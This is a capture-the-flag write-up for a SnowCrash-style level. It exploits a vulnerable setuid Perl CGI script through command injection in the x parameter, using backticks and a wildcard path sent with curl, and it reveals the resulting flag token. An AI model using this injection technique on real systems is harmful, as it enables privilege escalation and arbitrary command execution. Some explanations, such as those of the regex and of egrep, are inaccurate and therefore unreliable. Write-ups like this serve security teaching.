# LEVEL 12

In our home directory, we see a perl script with suid/guid bit and extended permissions:
    >$ ls -l
    total 4
    -rwsr-sr-x+ 1 flag12 level12 464 Mar  5  2016 level12.pl

let's understand what the script does:
    >$ cat level12.pl
    #!/usr/bin/env perl
    # localhost:4646
    use CGI qw{param};
    print "Content-type: text/html\n\n";

    sub t {
      $nn = $_[1];
      $xx = $_[0];
      $xx =~ tr/a-z/A-Z/;
      $xx =~ s/\s.*//;
      @output = `egrep "^$xx" /tmp/xd 2>&1`;
      foreach $line (@output) {
          ($f, $s) = split(/:/, $line);
          if($s =~ $nn) {
              return 1;
          }
      }
      return 0;
    }

    sub n {
      if($_[0] == 1) {
          print("..");
      } else {
          print(".");
      }
    }

    n(t(param("x"), param("y")));

This web page takes 2 parameters:`x` and` y`.

- `x` Passes into 2 regex, one to pass all characters to `upper case`, and another to make sure the argument must start with whitespaces characters and be followed by characters, then is used to execute the `egrep` command.

- `y` won't help us.

`egrep` is a command that will search for a pattern in folders that match that pattern.

Let's start by creating a script to run the `getflag` command in a file:

    >$ `echo "getflag > /tmp/test" > /tmp/EXPLOIT`

Then let's do the following test, replacing `/tmp` with `*` so that we don't have to worry about regex:
    >$ curl '{VM_IP}:4646?x="`/*/EXPLOIT`"'
    ..level12@SnowCrash:~$ cat /tmp/test
    cat: /tmp/test: No such file or directory

Our test file was not created, so the command did not work. And after running the script directly we can see this:
    >$ ./level12.pl x="`/*/EXPLOIT`"
    -bash: /tmp/EXPLOIT: Permission denied
    Content-type: text/html

    ..level12@SnowCrash:~$

We then just need to change the permissions of `EXPLOIT` with a chmod. If we run the commands again we can see that it works:
    >$ chmod 777 /tmp/EXPLOIT
    >$ curl '{VM_IP}:4646?x="`/*/EXPLOIT`"'
    ..level12@SnowCrash:~$ cat /tmp/test
    Check flag.here is your token : g1qKMiRpXf53AWhDaU7FEkczr

Vulnerability:
Privilege escalation via CGI code injection 